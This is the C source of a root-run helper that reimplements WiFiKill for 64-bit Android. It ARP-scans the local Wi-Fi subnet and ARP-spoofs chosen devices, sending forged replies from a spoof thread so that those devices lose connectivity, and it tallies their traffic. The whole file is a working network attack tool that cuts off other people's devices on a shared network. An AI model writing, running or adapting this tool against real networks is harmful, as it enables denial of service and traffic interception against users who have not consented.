/*
 * wfk - 64-bit reimplementation of the WiFiKill helper.
 *
 * Protocol (consumed by me.paranoid.wifikill.service.WFKService):
 *   argv[1] = local IPv4 address of the Wi-Fi interface
 *   stdout lines:
 *     *** WFK  PID <pid>
 *     *** WFK  SEARCH <0..100>
 *     *** WFK  SEARCH COMPLETE #(<n> ips pinged)
 *     *** WFK  DEVICE_NEW <ip> <mac>
 *     *** WFK  DEVICE_UPDATE <ip> <sent-delta> <recv-delta>
 *   stdin commands:
 *     r            start ARP scan
 *     R            stop ARP scan
 *     1<ip>        attach (ARP-spoof) a device, cutting its connectivity
 *     0<ip>        detach and restore the device's ARP mappings
 *
 * Built statically for aarch64 and run as root on the device.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/ip.h>

#define MAX_DEVICES 512
#define SCAN_CAP 4096

typedef struct {
    uint32_t ip;
    uint8_t mac[6];
    int known;
    int attached;
    uint64_t delta_sent;
    uint64_t delta_recv;
} device_t;

static device_t devices[MAX_DEVICES];
static int device_count;
static pthread_mutex_t device_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t log_lock = PTHREAD_MUTEX_INITIALIZER;

static char ifname[IFNAMSIZ];
static uint32_t local_ip;
static uint32_t netmask;
static uint32_t gateway_ip;
static uint8_t local_mac[6];
static uint8_t gateway_mac[6];
static int gateway_mac_known;
static int ifindex = -1;
static int raw_fd = -1;

static volatile sig_atomic_t stop_flag;
static volatile sig_atomic_t searching;
static volatile sig_atomic_t spoofing;

static void log_line(const char *fmt, ...) {
    va_list ap;
    pthread_mutex_lock(&log_lock);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
    pthread_mutex_unlock(&log_lock);
}

static void emit(const char *fmt, ...) {
    va_list ap;
    pthread_mutex_lock(&log_lock);
    fputs("*** WFK  ", stdout);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fputc('\n', stdout);
    fflush(stdout);
    pthread_mutex_unlock(&log_lock);
}

static void emit_error(const char *fmt, ...) {
    va_list ap;
    pthread_mutex_lock(&log_lock);
    fputs("ERROR:  ", stdout);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fputc('\n', stdout);
    fflush(stdout);
    pthread_mutex_unlock(&log_lock);
}

static void mac_to_string(const uint8_t mac[6], char out[18]) {
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static int string_to_mac(const char *text, uint8_t mac[6]) {
    unsigned int v[6];
    if (sscanf(text, "%x:%x:%x:%x:%x:%x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) {
        return 0;
    }
    for (int i = 0; i < 6; i++) {
        if (v[i] > 255) {
            return 0;
        }
        mac[i] = (uint8_t) v[i];
    }
    return 1;
}

static device_t *device_find(uint32_t ip) {
    for (int i = 0; i < device_count; i++) {
        if (devices[i].ip == ip) {
            return &devices[i];
        }
    }
    return NULL;
}

static device_t *device_add(uint32_t ip, const uint8_t mac[6]) {
    if (device_count >= MAX_DEVICES) {
        return NULL;
    }
    device_t *device = &devices[device_count++];
    memset(device, 0, sizeof(*device));
    device->ip = ip;
    memcpy(device->mac, mac, 6);
    device->known = 1;
    char mac_text[18];
    mac_to_string(mac, mac_text);
    struct in_addr addr;
    addr.s_addr = ip;
    emit("DEVICE_NEW %s %s", inet_ntoa(addr), mac_text);
    return device;
}

static void remember(uint32_t ip, const uint8_t mac[6]) {
    if (ip == 0 || ip == local_ip) {
        return;
    }
    if ((ip & netmask) != (local_ip & netmask)) {
        return;
    }
    pthread_mutex_lock(&device_lock);
    device_t *device = device_find(ip);
    if (device == NULL) {
        device_add(ip, mac);
    } else {
        memcpy(device->mac, mac, 6);
        device->known = 1;
    }
    pthread_mutex_unlock(&device_lock);
}

static void read_proc_arp(uint32_t wanted_ip, uint8_t mac[6], int *found) {
    FILE *file = fopen("/proc/net/arp", "r");
    if (file == NULL) {
        return;
    }
    char line[256];
    if (fgets(line, sizeof(line), file) == NULL) {
        fclose(file);
        return;
    }
    while (fgets(line, sizeof(line), file) != NULL) {
        char ip_text[64], hw_text[64];
        unsigned int flags;
        if (sscanf(line, "%63s 0x%x %63s", ip_text, &flags, hw_text) != 3) {
            continue;
        }
        struct in_addr addr;
        if (inet_aton(ip_text, &addr) == 0) {
            continue;
        }
        if (addr.s_addr != wanted_ip) {
            continue;
        }
        if (strcmp(hw_text, "00:00:00:00:00:00") == 0) {
            continue;
        }
        if (string_to_mac(hw_text, mac)) {
            *found = 1;
        }
        break;
    }
    fclose(file);
}

static void build_arp(uint8_t frame[42], const uint8_t eth_dst[6],
                      const uint8_t sha[6], uint32_t spa,
                      const uint8_t tha[6], uint32_t tpa, uint16_t op) {
    memset(frame, 0, 42);
    memcpy(frame, eth_dst, 6);
    memcpy(frame + 6, local_mac, 6);
    uint16_t eth_proto = htons(ETH_P_ARP);
    memcpy(frame + 12, &eth_proto, 2);
    uint16_t hw = htons(ARPHRD_ETHER);
    memcpy(frame + 14, &hw, 2);
    uint16_t proto = htons(ETH_P_IP);
    memcpy(frame + 16, &proto, 2);
    frame[18] = 6;
    frame[19] = 4;
    uint16_t arp_op = htons(op);
    memcpy(frame + 20, &arp_op, 2);
    memcpy(frame + 22, sha, 6);
    memcpy(frame + 28, &spa, 4);
    memcpy(frame + 32, tha, 6);
    memcpy(frame + 38, &tpa, 4);
}

static int send_arp(const uint8_t eth_dst[6], const uint8_t sha[6],
                    uint32_t spa, const uint8_t tha[6], uint32_t tpa,
                    uint16_t op) {
    uint8_t frame[42];
    build_arp(frame, eth_dst, sha, spa, tha, tpa, op);
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memcpy(addr.sll_addr, eth_dst, 6);
    ssize_t sent = sendto(raw_fd, frame, sizeof(frame), 0,
                          (struct sockaddr *) &addr, sizeof(addr));
    return sent == (ssize_t) sizeof(frame);
}

static void send_arp_request(uint32_t target_ip) {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t zero[6] = {0, 0, 0, 0, 0, 0};
    send_arp(broadcast, local_mac, local_ip, zero, target_ip, ARPOP_REQUEST);
}

static int wait_for_device(uint32_t ip, uint8_t mac[6], int timeout_ms) {
    int steps = timeout_ms / 50;
    for (int i = 0; i < steps; i++) {
        pthread_mutex_lock(&device_lock);
        device_t *device = device_find(ip);
        if (device != NULL && device->known) {
            memcpy(mac, device->mac, 6);
            pthread_mutex_unlock(&device_lock);
            return 1;
        }
        pthread_mutex_unlock(&device_lock);
        usleep(50000);
    }
    return 0;
}

static int resolve_mac(uint32_t ip, uint8_t mac[6]) {
    int found = 0;
    read_proc_arp(ip, mac, &found);
    if (found) {
        return 1;
    }
    pthread_mutex_lock(&device_lock);
    device_t *device = device_find(ip);
    if (device != NULL && device->known) {
        memcpy(mac, device->mac, 6);
        pthread_mutex_unlock(&device_lock);
        return 1;
    }
    pthread_mutex_unlock(&device_lock);
    for (int attempt = 0; attempt < 3; attempt++) {
        send_arp_request(ip);
        if (wait_for_device(ip, mac, 700)) {
            return 1;
        }
        if (read_proc_arp(ip, mac, &found), found) {
            return 1;
        }
    }
    return 0;
}

static void *arp_reader(void *arg) {
    (void) arg;
    uint8_t buffer[2048];
    while (!stop_flag) {
        struct sockaddr_ll from;
        socklen_t from_len = sizeof(from);
        ssize_t length = recvfrom(raw_fd, buffer, sizeof(buffer), 0,
                                  (struct sockaddr *) &from, &from_len);
        if (length < 42) {
            continue;
        }
        uint16_t eth_proto;
        memcpy(&eth_proto, buffer + 12, 2);
        eth_proto = ntohs(eth_proto);
        if (eth_proto == ETH_P_ARP) {
            uint16_t op;
            memcpy(&op, buffer + 20, 2);
            op = ntohs(op);
            if (op != ARPOP_REQUEST && op != ARPOP_REPLY) {
                continue;
            }
            uint32_t spa;
            memcpy(&spa, buffer + 28, 4);
            remember(spa, buffer + 22);
        } else if (eth_proto == ETH_P_IP && length >= 34) {
            const struct iphdr *ip = (const struct iphdr *) (buffer + 14);
            if (ip->version != 4) {
                continue;
            }
            uint32_t src, dst;
            memcpy(&src, &ip->saddr, 4);
            memcpy(&dst, &ip->daddr, 4);
            uint64_t bytes = ntohs(ip->tot_len);
            pthread_mutex_lock(&device_lock);
            device_t *from_device = device_find(src);
            if (from_device != NULL) {
                from_device->delta_sent += bytes;
            }
            device_t *to_device = device_find(dst);
            if (to_device != NULL && to_device != from_device) {
                to_device->delta_recv += bytes;
            }
            pthread_mutex_unlock(&device_lock);
        }
    }
    return NULL;
}

static void *stats_thread(void *arg) {
    (void) arg;
    while (!stop_flag) {
        sleep(1);
        pthread_mutex_lock(&device_lock);
        for (int i = 0; i < device_count; i++) {
            device_t *device = &devices[i];
            if (device->delta_sent == 0 && device->delta_recv == 0) {
                continue;
            }
            struct in_addr addr;
            addr.s_addr = device->ip;
            char ip_text[32];
            snprintf(ip_text, sizeof(ip_text), "%s", inet_ntoa(addr));
            uint64_t sent = device->delta_sent;
            uint64_t recv = device->delta_recv;
            device->delta_sent = 0;
            device->delta_recv = 0;
            pthread_mutex_unlock(&device_lock);
            emit("DEVICE_UPDATE %s %llu %llu", ip_text,
                 (unsigned long long) sent, (unsigned long long) recv);
            pthread_mutex_lock(&device_lock);
        }
        pthread_mutex_unlock(&device_lock);
    }
    return NULL;
}

static void scan_range(uint32_t *start, uint32_t *stop) {
    uint32_t host_mask = ~netmask;
    uint32_t network = local_ip & netmask;
    *start = ntohl(network) + 1;
    *stop = ntohl(network) + ntohl(host_mask) - 1;
    if (host_mask == 0) {
        *start = ntohl(network) + 1;
        *stop = ntohl(network) + 254;
    }
}

static void *scan_thread(void *arg) {
    (void) arg;
    uint32_t start, stop;
    scan_range(&start, &stop);
    uint64_t total = (uint64_t) stop - start + 1;
    if (total > SCAN_CAP) {
        stop = start + SCAN_CAP - 1;
        total = SCAN_CAP;
    }
    while (!stop_flag) {
        if (!searching) {
            usleep(200000);
            continue;
        }
        int last_percent = -1;
        for (uint64_t i = 0; i < total && searching && !stop_flag; i++) {
            uint32_t host = htonl((uint32_t) (start + i));
            send_arp_request(host);
            int percent = (int) ((i + 1) * 100 / total);
            if (percent != last_percent && (percent % 2 == 0 || percent == 100)) {
                emit("SEARCH %d", percent);
                last_percent = percent;
            }
            usleep(800);
        }
        if (searching && !stop_flag) {
            emit("SEARCH 100");
            emit("SEARCH COMPLETE #(%d ips pinged)", (int) total);
        }
        for (int i = 0; i < 50 && searching && !stop_flag; i++) {
            usleep(100000);
        }
    }
    return NULL;
}

static void restore_device(device_t *device) {
    if (!gateway_mac_known) {
        return;
    }
    char ip_text[32], gw_text[32];
    struct in_addr addr;
    addr.s_addr = device->ip;
    snprintf(ip_text, sizeof(ip_text), "%s", inet_ntoa(addr));
    addr.s_addr = gateway_ip;
    snprintf(gw_text, sizeof(gw_text), "%s", inet_ntoa(addr));
    for (int i = 0; i < 3; i++) {
        send_arp(device->mac, gateway_mac, gateway_ip, device->mac,
                 device->ip, ARPOP_REPLY);
        send_arp(gateway_mac, device->mac, device->ip, gateway_mac,
                 gateway_ip, ARPOP_REPLY);
        usleep(150000);
    }
    log_line("restoring route for: %s\n", ip_text);
    (void) gw_text;
}

static void *spoof_thread(void *arg) {
    (void) arg;
    while (!stop_flag) {
        if (!spoofing) {
            usleep(200000);
            continue;
        }
        pthread_mutex_lock(&device_lock);
        for (int i = 0; i < device_count; i++) {
            device_t *device = &devices[i];
            if (!device->attached || !device->known) {
                continue;
            }
            send_arp(device->mac, local_mac, gateway_ip, device->mac,
                     device->ip, ARPOP_REPLY);
            if (gateway_mac_known) {
                send_arp(gateway_mac, local_mac, device->ip, gateway_mac,
                         gateway_ip, ARPOP_REPLY);
            }
        }
        pthread_mutex_unlock(&device_lock);
        usleep(900000);
    }
    return NULL;
}

static void attach_device(uint32_t ip) {
    pthread_mutex_lock(&device_lock);
    device_t *device = device_find(ip);
    pthread_mutex_unlock(&device_lock);
    if (device == NULL || !device->known) {
        uint8_t mac[6];
        if (!resolve_mac(ip, mac)) {
            log_line("+++ device: `%s' not found!\n", "");
            return;
        }
        pthread_mutex_lock(&device_lock);
        device = device_find(ip);
        if (device == NULL) {
            device = device_add(ip, mac);
        } else {
            memcpy(device->mac, mac, 6);
            device->known = 1;
        }
        pthread_mutex_unlock(&device_lock);
    }
    if (!gateway_mac_known) {
        if (resolve_mac(gateway_ip, gateway_mac)) {
            gateway_mac_known = 1;
        } else {
            log_line("+++ unable to resolve gateway, spoofing anyway\n");
        }
    }
    device->attached = 1;
    spoofing = 1;
    char ip_text[32], mac_text[18];
    struct in_addr addr;
    addr.s_addr = ip;
    snprintf(ip_text, sizeof(ip_text), "%s", inet_ntoa(addr));
    mac_to_string(device->mac, mac_text);
    log_line("+++ attaching to: %s (%s)\n", ip_text, mac_text);
}

static void detach_device(uint32_t ip) {
    pthread_mutex_lock(&device_lock);
    device_t *device = device_find(ip);
    if (device != NULL && device->attached) {
        restore_device(device);
        device->attached = 0;
    }
    int any = 0;
    for (int i = 0; i < device_count; i++) {
        if (devices[i].attached) {
            any = 1;
        }
    }
    spoofing = any;
    pthread_mutex_unlock(&device_lock);
    struct in_addr addr;
    addr.s_addr = ip;
    log_line("+++ detaching from: %s\n", inet_ntoa(addr));
}

static void restore_all(void) {
    pthread_mutex_lock(&device_lock);
    for (int i = 0; i < device_count; i++) {
        if (devices[i].attached) {
            restore_device(&devices[i]);
            devices[i].attached = 0;
        }
    }
    spoofing = 0;
    pthread_mutex_unlock(&device_lock);
}

static void handle_signal(int sig) {
    (void) sig;
    stop_flag = 1;
}

static int find_interface(uint32_t wanted_ip, const char *forced, char *out,
                          size_t out_len, uint32_t *mask_out) {
    struct ifaddrs *list = NULL;
    if (getifaddrs(&list) != 0) {
        return 0;
    }
    int found = 0;
    for (struct ifaddrs *entry = list; entry != NULL; entry = entry->ifa_next) {
        if (entry->ifa_addr == NULL
                || entry->ifa_addr->sa_family != AF_INET) {
            continue;
        }
        if (forced != NULL && strcmp(entry->ifa_name, forced) != 0) {
            continue;
        }
        struct sockaddr_in *addr = (struct sockaddr_in *) entry->ifa_addr;
        if (forced == NULL && addr->sin_addr.s_addr != wanted_ip) {
            continue;
        }
        struct sockaddr_in *mask = (struct sockaddr_in *) entry->ifa_netmask;
        snprintf(out, out_len, "%s", entry->ifa_name);
        if (mask != NULL) {
            *mask_out = mask->sin_addr.s_addr;
        }
        found = 1;
        break;
    }
    freeifaddrs(list);
    return found;
}

static int get_mac_address(const char *name, uint8_t mac[6]) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        return 0;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", name);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
        close(fd);
        return 0;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 1;
}

static uint32_t read_gateway(void) {
    FILE *file = fopen("/proc/net/route", "r");
    if (file == NULL) {
        return 0;
    }
    char line[256];
    if (fgets(line, sizeof(line), file) == NULL) {
        fclose(file);
        return 0;
    }
    while (fgets(line, sizeof(line), file) != NULL) {
        char name[64];
        unsigned int destination, gateway, flags;
        if (sscanf(line, "%63s %x %x %x", name, &destination, &gateway,
                   &flags) != 4) {
            continue;
        }
        if (destination != 0) {
            continue;
        }
        if (strcmp(name, ifname) != 0) {
            continue;
        }
        fclose(file);
        return gateway;
    }
    fclose(file);
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "No IP address given!\n");
        return 1;
    }
    struct in_addr addr;
    if (inet_aton(argv[1], &addr) == 0) {
        fprintf(stderr, "No IP address given!\n");
        return 1;
    }
    local_ip = addr.s_addr;
    const char *forced_iface = argc >= 3 ? argv[2] : NULL;
    netmask = 0;
    if (!find_interface(local_ip, forced_iface, ifname, sizeof(ifname),
                        &netmask)) {
        emit_error("no matching interface for %s", argv[1]);
        return 1;
    }
    if (netmask == 0) {
        netmask = htonl(0xffffff00);
    }
    if (!get_mac_address(ifname, local_mac)) {
        emit_error("cannot read hardware address");
        return 1;
    }
    ifindex = (int) if_nametoindex(ifname);
    if (ifindex <= 0) {
        emit_error("cannot resolve interface index");
        return 1;
    }

    raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_fd < 0) {
        emit_error("socket: %s", strerror(errno));
        return 1;
    }
    struct sockaddr_ll bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sll_family = AF_PACKET;
    bind_addr.sll_protocol = htons(ETH_P_ALL);
    bind_addr.sll_ifindex = ifindex;
    if (bind(raw_fd, (struct sockaddr *) &bind_addr, sizeof(bind_addr)) != 0) {
        emit_error("bind: %s", strerror(errno));
        return 1;
    }
    struct timeval timeout = {0, 300000};
    setsockopt(raw_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    gateway_ip = read_gateway();
    if (gateway_ip != 0) {
        uint8_t mac[6];
        int found = 0;
        read_proc_arp(gateway_ip, mac, &found);
        if (found) {
            memcpy(gateway_mac, mac, 6);
            gateway_mac_known = 1;
        }
    }

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGPIPE, SIG_IGN);

    printf("*** WFK  PID %d\n", (int) getpid());
    fflush(stdout);

    pthread_t reader, scanner, spoofer, stats;
    pthread_create(&reader, NULL, arp_reader, NULL);
    pthread_create(&scanner, NULL, scan_thread, NULL);
    pthread_create(&spoofer, NULL, spoof_thread, NULL);
    pthread_create(&stats, NULL, stats_thread, NULL);

    char line[256];
    while (!stop_flag && fgets(line, sizeof(line), stdin) != NULL) {
        if (line[0] == 'r') {
            searching = 1;
        } else if (line[0] == 'R') {
            searching = 0;
        } else if (line[0] == '1') {
            uint32_t ip;
            if (inet_aton(line + 1, &addr)) {
                ip = addr.s_addr;
                attach_device(ip);
            }
        } else if (line[0] == '0') {
            uint32_t ip;
            if (inet_aton(line + 1, &addr)) {
                ip = addr.s_addr;
                detach_device(ip);
            }
        } else if (line[0] == 'q') {
            break;
        }
    }

    stop_flag = 1;
    log_line("restoring arp table\n");
    restore_all();
    searching = 0;
    if (raw_fd >= 0) {
        shutdown(raw_fd, SHUT_RDWR);
        close(raw_fd);
    }
    pthread_join(reader, NULL);
    pthread_join(scanner, NULL);
    pthread_join(spoofer, NULL);
    pthread_join(stats, NULL);
    log_line("--- exiting!\n");
    return 0;
}
